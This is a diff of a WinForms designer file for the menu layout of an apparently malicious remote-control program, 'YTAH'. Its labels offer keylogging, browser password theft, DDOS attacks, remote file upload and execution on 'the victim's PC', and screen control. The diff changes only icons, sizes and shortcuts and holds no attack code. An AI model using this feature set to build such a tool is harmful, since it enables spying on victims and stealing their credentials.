@@ -81,6 +81,7 @@
             // menuStrip1
             // 
             this.menuStrip1.BackColor = System.Drawing.SystemColors.Control;
+            this.menuStrip1.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.menuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.fUNTOOLSToolStripMenuItem,
             this.dDOSTOOLSToolStripMenuItem,
@@ -119,6 +120,7 @@
             this.kEYLOGGERToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.toolStripTextBox3});
             this.kEYLOGGERToolStripMenuItem.ForeColor = System.Drawing.SystemColors.ControlText;
+            this.kEYLOGGERToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("kEYLOGGERToolStripMenuItem.Image")));
             this.kEYLOGGERToolStripMenuItem.Name = "kEYLOGGERToolStripMenuItem";
             this.kEYLOGGERToolStripMenuItem.ShortcutKeyDisplayString = "";
             this.kEYLOGGERToolStripMenuItem.Size = new System.Drawing.Size(250, 22);
@@ -141,6 +143,7 @@
             // 
             this.toolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.toolStripTextBox1});
+            this.toolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem1.Image")));
             this.toolStripMenuItem1.Name = "toolStripMenuItem1";
             this.toolStripMenuItem1.Size = new System.Drawing.Size(250, 22);
             this.toolStripMenuItem1.Text = "Démarrer un processus";
@@ -168,6 +171,7 @@
             // 
             // listerLesProcessusToolStripMenuItem
             // 
+            this.listerLesProcessusToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("listerLesProcessusToolStripMenuItem.Image")));
             this.listerLesProcessusToolStripMenuItem.Name = "listerLesProcessusToolStripMenuItem";
             this.listerLesProcessusToolStripMenuItem.ShortcutKeys = ((System.Windows.Forms.Keys)((System.Windows.Forms.Keys.Control | System.Windows.Forms.Keys.L)));
             this.listerLesProcessusToolStripMenuItem.Size = new System.Drawing.Size(250, 22);
@@ -181,6 +185,7 @@
             // 
             // eteindreLePCToolStripMenuItem
             // 
+            this.eteindreLePCToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("eteindreLePCToolStripMenuItem.Image")));
             this.eteindreLePCToolStripMenuItem.Name = "eteindreLePCToolStripMenuItem";
             this.eteindreLePCToolStripMenuItem.RightToLeft = System.Windows.Forms.RightToLeft.No;
             this.eteindreLePCToolStripMenuItem.ShortcutKeys = ((System.Windows.Forms.Keys)((System.Windows.Forms.Keys.Control | System.Windows.Forms.Keys.F4)));
@@ -198,6 +203,8 @@
             this.freezeLaSourisToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.freezeToolStripMenuItem,
             this.unfreezeToolStripMenuItem});
+            this.freezeLaSourisToolStripMenuItem.Enabled = false;
+            this.freezeLaSourisToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("freezeLaSourisToolStripMenuItem.Image")));
             this.freezeLaSourisToolStripMenuItem.Name = "freezeLaSourisToolStripMenuItem";
             this.freezeLaSourisToolStripMenuItem.Size = new System.Drawing.Size(250, 22);
             this.freezeLaSourisToolStripMenuItem.Text = "Freeze la souris";
@@ -205,13 +212,13 @@
             // freezeToolStripMenuItem
             // 
             this.freezeToolStripMenuItem.Name = "freezeToolStripMenuItem";
-            this.freezeToolStripMenuItem.Size = new System.Drawing.Size(120, 22);
+            this.freezeToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.freezeToolStripMenuItem.Text = "Freeze";
             // 
             // unfreezeToolStripMenuItem
             // 
             this.unfreezeToolStripMenuItem.Name = "unfreezeToolStripMenuItem";
-            this.unfreezeToolStripMenuItem.Size = new System.Drawing.Size(120, 22);
+            this.unfreezeToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.unfreezeToolStripMenuItem.Text = "Unfreeze";
             // 
             // partageDécranToolStripMenuItem
@@ -219,6 +226,8 @@
             this.partageDécranToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.avecContrôleToolStripMenuItem,
             this.sansContrôleToolStripMenuItem});
+            this.partageDécranToolStripMenuItem.Enabled = false;
+            this.partageDécranToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("partageDécranToolStripMenuItem.Image")));
             this.partageDécranToolStripMenuItem.Name = "partageDécranToolStripMenuItem";
             this.partageDécranToolStripMenuItem.Size = new System.Drawing.Size(250, 22);
             this.partageDécranToolStripMenuItem.Text = "Partage d\'écran";
@@ -226,13 +235,13 @@
             // avecContrôleToolStripMenuItem
             // 
             this.avecContrôleToolStripMenuItem.Name = "avecContrôleToolStripMenuItem";
-            this.avecContrôleToolStripMenuItem.Size = new System.Drawing.Size(147, 22);
+            this.avecContrôleToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.avecContrôleToolStripMenuItem.Text = "Avec contrôle";
             // 
             // sansContrôleToolStripMenuItem
             // 
             this.sansContrôleToolStripMenuItem.Name = "sansContrôleToolStripMenuItem";
-            this.sansContrôleToolStripMenuItem.Size = new System.Drawing.Size(147, 22);
+            this.sansContrôleToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.sansContrôleToolStripMenuItem.Text = "Sans contrôle";
             // 
             // dDOSTOOLSToolStripMenuItem
@@ -251,30 +260,34 @@
             this.lancerUneAttaqueToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.surUneIPToolStripMenuItem,
             this.surCetteIPToolStripMenuItem});
+            this.lancerUneAttaqueToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("lancerUneAttaqueToolStripMenuItem.Image")));
             this.lancerUneAttaqueToolStripMenuItem.Name = "lancerUneAttaqueToolStripMenuItem";
-            this.lancerUneAttaqueToolStripMenuItem.Size = new System.Drawing.Size(197, 22);
+            this.lancerUneAttaqueToolStripMenuItem.Size = new System.Drawing.Size(305, 22);
             this.lancerUneAttaqueToolStripMenuItem.Text = "DDOS";
             this.lancerUneAttaqueToolStripMenuItem.Click += new System.EventHandler(this.lancerUneAttaqueToolStripMenuItem_Click);
             // 
             // surUneIPToolStripMenuItem
             // 
             this.surUneIPToolStripMenuItem.Name = "surUneIPToolStripMenuItem";
-            this.surUneIPToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
+            this.surUneIPToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.surUneIPToolStripMenuItem.Text = "Sur une IP";
             this.surUneIPToolStripMenuItem.ToolTipText = "Lance une attaque contre une IP (Exemple site)";
             // 
             // surCetteIPToolStripMenuItem
             // 
             this.surCetteIPToolStripMenuItem.Name = "surCetteIPToolStripMenuItem";
-            this.surCetteIPToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
+            this.surCetteIPToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.surCetteIPToolStripMenuItem.Text = "Sur cette IP";
             this.surCetteIPToolStripMenuItem.ToolTipText = "Lance une attaque contre l\'utilisateur contrôlé";
             // 
             // récupérerLIPDunSiteToolStripMenuItem
             // 
+            this.récupérerLIPDunSiteToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("récupérerLIPDunSiteToolStripMenuItem.Image")));
             this.récupérerLIPDunSiteToolStripMenuItem.Name = "récupérerLIPDunSiteToolStripMenuItem";
-            this.récupérerLIPDunSiteToolStripMenuItem.Size = new System.Drawing.Size(197, 22);
-            this.récupérerLIPDunSiteToolStripMenuItem.Text = "Récupérer l\'IP d\'un site ";
+            this.récupérerLIPDunSiteToolStripMenuItem.ShortcutKeys = ((System.Windows.Forms.Keys)(((System.Windows.Forms.Keys.Control | System.Windows.Forms.Keys.Alt) 
+            | System.Windows.Forms.Keys.S)));
+            this.récupérerLIPDunSiteToolStripMenuItem.Size = new System.Drawing.Size(305, 22);
+            this.récupérerLIPDunSiteToolStripMenuItem.Text = "Récupérer l\'IP d\'un site                ";
             // 
             // sPYTOOLSToolStripMenuItem
             // 
@@ -292,6 +305,7 @@
             // 
             // téléchargerLesKeylogsToolStripMenuItem1
             // 
+            this.téléchargerLesKeylogsToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("téléchargerLesKeylogsToolStripMenuItem1.Image")));
             this.téléchargerLesKeylogsToolStripMenuItem1.Name = "téléchargerLesKeylogsToolStripMenuItem1";
             this.téléchargerLesKeylogsToolStripMenuItem1.ShortcutKeys = ((System.Windows.Forms.Keys)(((System.Windows.Forms.Keys.Control | System.Windows.Forms.Keys.Shift) 
             | System.Windows.Forms.Keys.K)));
@@ -300,6 +314,7 @@
             // 
             // récupérerLesMotsDePasseNavigateurToolStripMenuItem1
             // 
+            this.récupérerLesMotsDePasseNavigateurToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("récupérerLesMotsDePasseNavigateurToolStripMenuItem1.Image")));
             this.récupérerLesMotsDePasseNavigateurToolStripMenuItem1.Name = "récupérerLesMotsDePasseNavigateurToolStripMenuItem1";
             this.récupérerLesMotsDePasseNavigateurToolStripMenuItem1.ShortcutKeys = ((System.Windows.Forms.Keys)(((System.Windows.Forms.Keys.Control | System.Windows.Forms.Keys.Shift) 
             | System.Windows.Forms.Keys.N)));
@@ -316,6 +331,8 @@
             this.uploadUnFichierToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.avecExécutionToolStripMenuItem,
             this.sansExécutionToolStripMenuItem});
+            this.uploadUnFichierToolStripMenuItem.Enabled = false;
+            this.uploadUnFichierToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("uploadUnFichierToolStripMenuItem.Image")));
             this.uploadUnFichierToolStripMenuItem.Name = "uploadUnFichierToolStripMenuItem";
             this.uploadUnFichierToolStripMenuItem.Size = new System.Drawing.Size(397, 22);
             this.uploadUnFichierToolStripMenuItem.Text = "Upload un fichier";
@@ -323,14 +340,14 @@
             // avecExécutionToolStripMenuItem
             // 
             this.avecExécutionToolStripMenuItem.Name = "avecExécutionToolStripMenuItem";
-            this.avecExécutionToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
+            this.avecExécutionToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.avecExécutionToolStripMenuItem.Text = "Avec exécution";
             this.avecExécutionToolStripMenuItem.ToolTipText = "Va s\'exécuter une fois téléchargé sur le PC de la victime";
             // 
             // sansExécutionToolStripMenuItem
             // 
             this.sansExécutionToolStripMenuItem.Name = "sansExécutionToolStripMenuItem";
-            this.sansExécutionToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
+            this.sansExécutionToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.sansExécutionToolStripMenuItem.Text = "Sans exécution";
             this.sansExécutionToolStripMenuItem.ToolTipText = "Ne va pas s\'exécuter une fois téléchargé sur le PC de la victime";
             // 
@@ -364,7 +381,7 @@
             // 
             this.aProposDeYTAHToolStripMenuItem.Name = "aProposDeYTAHToolStripMenuItem";
             this.aProposDeYTAHToolStripMenuItem.Size = new System.Drawing.Size(238, 22);
-            this.aProposDeYTAHToolStripMenuItem.Text = "A propos de YTAH";
+            this.aProposDeYTAHToolStripMenuItem.Text = "À propos de YTAH";
             // 
             // optionsToolStripMenuItem
             // 
@@ -373,32 +390,37 @@
             this.toolStripSeparator3,
             this.seDéconnecterToolStripMenuItem,
             this.quitterToolStripMenuItem});
+            this.optionsToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.optionsToolStripMenuItem.Name = "optionsToolStripMenuItem";
             this.optionsToolStripMenuItem.Size = new System.Drawing.Size(61, 20);
             this.optionsToolStripMenuItem.Text = "Options";
             // 
             // retourEnArrièreToolStripMenuItem
             // 
+            this.retourEnArrièreToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("retourEnArrièreToolStripMenuItem.Image")));
             this.retourEnArrièreToolStripMenuItem.Name = "retourEnArrièreToolStripMenuItem";
-            this.retourEnArrièreToolStripMenuItem.Size = new System.Drawing.Size(198, 22);
+            this.retourEnArrièreToolStripMenuItem.Size = new System.Drawing.Size(270, 22);
             this.retourEnArrièreToolStripMenuItem.Text = "Retour en arrière";
             // 
             // toolStripSeparator3
             // 
             this.toolStripSeparator3.Name = "toolStripSeparator3";
-            this.toolStripSeparator3.Size = new System.Drawing.Size(195, 6);
+            this.toolStripSeparator3.Size = new System.Drawing.Size(267, 6);
             // 
             // seDéconnecterToolStripMenuItem
             // 
             this.seDéconnecterToolStripMenuItem.Name = "seDéconnecterToolStripMenuItem";
-            this.seDéconnecterToolStripMenuItem.Size = new System.Drawing.Size(198, 22);
-            this.seDéconnecterToolStripMenuItem.Text = "Se déconnecter";
+            this.seDéconnecterToolStripMenuItem.ShortcutKeys = ((System.Windows.Forms.Keys)(((System.Windows.Forms.Keys.Control | System.Windows.Forms.Keys.Shift) 
+            | System.Windows.Forms.Keys.D)));
+            this.seDéconnecterToolStripMenuItem.Size = new System.Drawing.Size(270, 22);
+            this.seDéconnecterToolStripMenuItem.Text = "Se déconnecter               ";
             // 
             // quitterToolStripMenuItem
             // 
+            this.quitterToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("quitterToolStripMenuItem.Image")));
             this.quitterToolStripMenuItem.Name = "quitterToolStripMenuItem";
             this.quitterToolStripMenuItem.ShortcutKeys = ((System.Windows.Forms.Keys)((System.Windows.Forms.Keys.Alt | System.Windows.Forms.Keys.F4)));
-            this.quitterToolStripMenuItem.Size = new System.Drawing.Size(198, 22);
+            this.quitterToolStripMenuItem.Size = new System.Drawing.Size(270, 22);
             this.quitterToolStripMenuItem.Text = "Quitter               ";
             this.quitterToolStripMenuItem.Click += new System.EventHandler(this.quitterToolStripMenuItem_Click);
             // 
